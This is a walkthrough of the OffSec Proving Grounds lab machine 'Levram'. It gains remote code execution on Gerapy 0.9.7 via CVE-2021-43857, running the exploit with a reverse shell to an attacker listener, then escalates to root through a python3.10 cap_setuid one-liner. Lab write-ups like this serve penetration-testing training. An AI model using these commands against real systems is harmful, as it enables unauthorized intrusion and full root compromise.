# Levram — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

Gerapy 0.9.7 with default creds → CVE-2021-43857 RCE (after manually creating a project) → shell → Python 3.10 has `cap_setuid` capability → root.

---

## Enumeration

Full port scan:

```bash
nmap -sV -p- 192.168.183.24
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 8000 | HTTP | WSGIServer/0.2 CPython/3.10.6 (Gerapy) |

Port 8000 is running **Gerapy** — a distributed web crawler management framework built on Scrapy. The version is **0.9.7**.

---

## Exploitation — CVE-2021-43857 (Gerapy RCE)

A quick search finds [EDB-50640](https://www.exploit-db.com/exploits/50640) — an RCE exploit for Gerapy < 0.9.8.

First attempt fails with an error:

```
IndexError: list index out of range
```

Reading the exploit code, it expects an existing **project** in Gerapy. The exploit tries to list projects and use the first one, but there are none by default.

**Fix:** Navigate to the Gerapy UI and create a project manually:

```
http://192.168.183.24:8000/#/project/lmao/configure
```

Create a project (any name works, e.g., "test"). Then run the exploit:

```bash
python3 50640.py -t 192.168.183.24 -p 8000 -L 192.168.45.228 -P 6969
```

This time it works — we catch a shell on our listener.

---

## Privilege Escalation — Python cap_setuid Capability

Let's check for Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.10 cap_setuid=ep
```

Python 3.10 has the `cap_setuid` capability — this means it can change its user ID to any user, including root. From [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities):

```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash -i")'
```

**Root.** 🎉

---

## Key Takeaways

- **Gerapy CVE-2021-43857** requires an existing project to exploit — if the exploit fails, check if you need to create one first
- **Linux capabilities** are often overlooked — `getcap -r / 2>/dev/null` should be in your enumeration checklist alongside SUID searches
- **`cap_setuid`** on any binary is basically game over — it lets the process assume root UID
- Always read exploit source code when it fails — the error message and code logic often tell you exactly what's needed

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
